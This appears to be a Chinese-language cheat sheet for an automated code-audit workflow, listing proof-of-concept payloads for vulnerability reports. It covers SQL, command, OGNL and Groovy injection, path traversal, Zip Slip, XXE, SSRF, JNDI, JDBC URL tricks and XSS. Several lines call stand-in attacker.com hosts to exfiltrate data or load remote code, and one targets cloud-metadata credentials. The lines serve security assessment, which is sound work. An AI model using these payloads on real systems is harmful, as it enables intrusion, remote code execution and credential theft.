# 红队 PoC 构造提示

用于在 skill 阶段 5 给每个 VULNERABLE 发现填写 `attack_vector` 和 `poc_payload`。

---

## 按 vuln_type 分类

- **SQL Injection**
  闭合单 / 双引号；`UNION SELECT`；盲注 `SLEEP(5)` 时间型；
  MyBatis 的 `${}` 直接注入列名；MSSQL 上叠加查询 → `xp_cmdshell` RCE。

- **Command Injection**
  shell 元字符：`;` `|` `&&` `$(cmd)` 反引号。
  `ProcessBuilder` 单 argv 路径下，可改用 `-c` 或 PATH 劫持（相对命令名 + 阴影 `ls`）。

- **Code Injection**（OGNL / MVEL / Groovy / JEXL / ScriptEngine）
  - OGNL：`@java.lang.Runtime@getRuntime().exec({'id'})` —— Struts2 S2-045 经典
  - MVEL：`Runtime.getRuntime().exec("id")`
  - Groovy：`"id".execute().text` —— 最简一行
  - JEXL：`''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(...)`
  - ScriptEngine（Nashorn）：`Java.type("java.lang.Runtime").getRuntime().exec("id")`

- **Path Traversal**
  `../../../etc/passwd`、URL 双重编码 `%2e%2e%2f`、Windows 反斜杠 `\..\`、
  UNC 路径 `\\attacker\share`、老 JVM 的 NULL 字节 `%00.txt`。

- **Zip Slip**
  ZipEntry 名含 `../../../etc/cron.d/恶意`。配合
  `FileOutputStream(entry.getName())` → 任意写文件。
  写入 `/etc/cron.d/` 或 webshell 目录 → RCE。

- **XXE**
  本地文件读取：`<!ENTITY xxe SYSTEM "file:///etc/passwd">`。
  带外 SSRF / 盲注：`SYSTEM "http://attacker.com/exfil?d=..."` 配合参数实体。

- **SSRF**
  内网地址：`http://127.0.0.1:8500/v1/catalog/services`（Consul）；
  云元数据：`http://169.254.169.254/latest/meta-data/iam/security-credentials/`；
  通过 `*.nip.io` 或自建解析器做 DNS rebinding。

- **LDAP Injection**
  `*` 通配符枚举；`)(objectclass=*` 闭合并注入二级 filter；
  `admin)(&(uid=*` 绕过认证检查。

- **XPath Injection**
  类 SQLi 的闭合 `' or '1'='1`；`')]|//user[contains('a','`；
  布尔盲注 `string-length(password)>5`。

- **Unsafe Deserialization**
  使用公开 gadget 链：Commons-Collections 的 `InvokerTransformer`、ROME 的
  `ToStringBean`、ysoserial 预制 payload。Spring / Jackson Default Typing 用 JNDI
  reference gadget。

- **JNDI Injection**
  `ldap://attacker.com/Exploit`（Log4Shell 同款）；`rmi://attacker.com/Exploit`；
  盲探用 `dns://attacker.com/x`。JDK 8u191+ 需要 `trustURLCodebase=true` 或本地工厂类。

- **JDBC URL Injection**
  - MySQL: `jdbc:mysql://attacker/?allowLoadLocalInfile=true&serverTimezone=UTC`
    （客户端任意文件读）或 `&autoDeserialize=true&queryInterceptors=...`
  - H2: `jdbc:h2:mem:test;INIT=SCRIPT FROM 'http://attacker.com/e.sql'`（RCE）
  - Postgres: `&socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://attacker.com/e.xml`

- **Unvalidated Forward**
  正常被 web filter 拦截的内部路径：`/WEB-INF/web.xml`、`/admin.jsp`、
  `/actuator/env`（Spring Boot）、`/console`。

- **Open Redirect**
  `//attacker.com`（协议相对）；`https:attacker.com`（畸形但浏览器容忍）；
  `legit.com.attacker.com`（域名尾注入）；`https://legit.com@attacker.com`（authority 混淆）。

- **XSS**
  按输出上下文选择：
  - HTML body：`<script>alert(1)</script>`、`<img src=x onerror=alert(1)>`
  - HTML 属性：`" onmouseover="alert(1)`、`" autofocus onfocus="alert(1)`
  - JS 上下文：`';alert(1);//`
  - URL 属性（href / src）：`javascript:alert(1)`
  - SVG：`"><svg/onload=alert(1)>`

- **Unsafe Reflection**
  目标类名：`java.lang.Runtime`、`javax.naming.InitialContext`、
  `java.beans.XMLDecoder`。`Class.forName(userInput).newInstance()` →
  任何拥有公开构造器的类都能被实例化。

- **Trust Boundary Violation**
  通过 `/setPref?key=role&value=ADMIN` 把 `isAdmin=true` / `role=ADMIN` 写入 session。
  后续鉴权读 `session.getAttribute("role")` 直接信任。

- **Sensitive Data in Log / URL**
  本身不需要构造 PoC 利用 —— 泄露即漏洞。`attack_vector` 写
  "通过中心化日志系统泄露"或"通过 Referer / CDN 日志泄露"。

- **Weak Cryptography / Weak Random / Insecure TLS / JWT None / Insecure
  Cookie / Insecure Temp File / Stack Trace Exposure**
  也无传统 PoC。`poc_payload` 可填示意性利用（如"alg:none header 的 JWT 被服务端
  当成有效 admin token 接受"），`attack_vector` 描述威胁模型。
